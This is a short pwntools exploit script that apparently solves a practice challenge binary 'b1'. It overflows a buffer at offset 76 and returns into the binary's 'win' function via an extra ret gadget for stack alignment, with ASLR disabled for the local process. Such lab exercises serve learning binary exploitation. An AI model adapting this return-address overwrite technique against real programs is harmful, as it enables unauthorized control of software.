#!/usr/bin/env python3
# B1: ret2win con gadget ret extra (alineacion movaps)
from pwn import context, process, ELF, p64, asm, log
context.binary = "./bin/b1"
elf = ELF("./bin/b1")
OFFSET = 76
win = elf.symbols["win"]
ret = next(elf.search(asm("ret"), writable=False))
log.info(f"win @ {hex(win)}, ret @ {hex(ret)}")
payload = b"A" * OFFSET + p64(ret) + p64(win)
io = process(["setarch", "x86_64", "-R", "./bin/b1"])
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="replace"))
